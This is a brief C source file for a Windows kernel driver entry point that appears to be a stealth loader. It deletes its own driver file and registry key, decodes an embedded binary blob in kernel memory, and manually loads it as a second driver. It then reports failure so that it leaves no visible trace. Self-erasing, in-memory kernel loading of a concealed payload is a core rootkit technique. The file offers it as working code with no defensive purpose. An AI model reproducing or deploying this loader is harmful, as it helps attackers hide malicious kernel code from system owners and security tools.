#include <ntifs.h>    
#include "Loader.h"
#include "data.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    suicide(&ldr->FullDllName);
    DeleteRegistryKey(RegistryPath);

    PUCHAR pMem = NULL;
    pMem = ExAllocatePool(NonPagedPool, sizeof(sysData));
    RtlCopyMemory(pMem, sysData, sizeof(sysData));
    docode(pMem, sizeof(sysData));
    loadDriver(pMem);

    ExFreePool(pMem);

    return STATUS_UNSUCCESSFUL;
}